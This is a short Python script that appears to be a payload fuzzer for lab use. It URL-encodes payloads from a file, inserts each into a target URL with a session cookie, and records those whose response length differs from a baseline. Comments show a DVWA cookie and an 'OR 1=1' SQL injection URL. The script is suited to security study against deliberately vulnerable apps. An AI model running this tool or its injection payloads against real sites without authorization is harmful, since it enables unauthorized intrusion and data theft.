import requests
import sys
import itertools  
import time
try:
    from urllib.parse import urlparse
except ImportError:
     import urllib as urlparse

print(sys.argv)

url = sys.argv[1]
method = sys.argv[2]
payload_file = sys.argv[3]
cookie = sys.argv[4]
normal_count = sys.argv[5]
output_file = sys.argv[6]

# Read list of payloads from file
with open(payload_file, 'r') as rf:
	contents = rf.read()
	contents = contents.split('\n')

sess = requests.Session()
headers = {"Cookie": cookie}    #headers = {"Cookie": "PHPSESSID=t3u2vbapjdedt2t75e22n2vlhv;security=low"}
print(headers)
success_payloads = []
success_url = []
success_response_len = []
success_counter = 0

BUFFER_SIZE = 10

start_time = time.time()
# URL Encode and send each payload 
for i in contents:
	encoded = urlparse.quote(i)
	url_ = url.replace('X', encoded)
	response = sess.get(url_, data={}, headers=headers)
	#response = sess.get("http://localhost/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit#", data=data, headers=headers)
	#response = sess.get("http://localhost/DVWA/vulnerabilities/sqli/?id=+'OR+1%3D1%23&Submit=Submit#", data=data, headers=headers)
    
	# Check the length of the response
	BUFFER_SIZE = len(encoded)
	if not ((int(normal_count) - BUFFER_SIZE) < len(response.text) < (int(normal_count) + BUFFER_SIZE)):
		success_payloads.append(i)
		success_url.append(response.request.url)
		success_response_len.append(str(len(response.text)))
		success_counter+=1
#		print(i)
#		print(response.request.url)
#		print(response.text)

time_run = time.time() - start_time
# Write the results to a file
with open(output_file, 'w') as rf:
	for i, j, k in zip(success_payloads, success_url, success_response_len):
		rf.write(i + '\n')
		rf.write('\t' + j + '\n')
		rf.write('\t' + k + '\n\n')
	rf.write(str(success_counter) + ' worked\n')
	rf.write("[*] Runtime: {}".format(time_run))
